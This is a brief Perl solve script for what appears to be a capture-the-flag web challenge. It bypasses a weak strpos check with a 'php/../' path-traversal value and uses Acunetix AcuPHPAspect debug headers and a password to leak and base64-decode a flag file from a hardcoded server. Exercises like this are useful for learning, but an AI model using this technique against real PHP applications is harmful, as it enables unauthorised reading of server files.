#!/usr/bin/env perl
use strict;
use warnings;

use feature 'say';

use MIME::Base64;
use WWW::Mechanize;


# using acu_phpaspect, we can determine that index.php is including "super_secret_file_containing_the_flag_you_should_read_it.php"
# and it is reading the $_GET['super_secret_parameter_hahaha'] variable
# strpos is run against [super_secret_parameter_hahaha] to find 'php'
# but it uses weak equality comparison
# so we can prefix the string with php to produce 0, which evaluates to false

# access the index page as the acu_phpaspect is already active as an auto-include
my $url = "http://54.200.58.235/index.php?super_secret_parameter_hahaha=php/../super_secret_file_containing_the_flag_you_should_read_it.php";
my $ua = WWW::Mechanize->new;
# specify acu_phpaspect headers
my $res = $ua->get($url, ACUNETIX_ASPECT => 'enabled', ACUNETIX_ASPECT_PASSWORD => '4faa9d4408780ae071ca2708e3f09449');

my $text = $res->decoded_content;
my @aspects;
while ($text =~ /<!--BKPASPECT:(.*?)-->/g) {
	push @aspects, $1;
}

say 'content: ', $res->decoded_content;
say 'data: ', decode_base64($_) for @aspects;

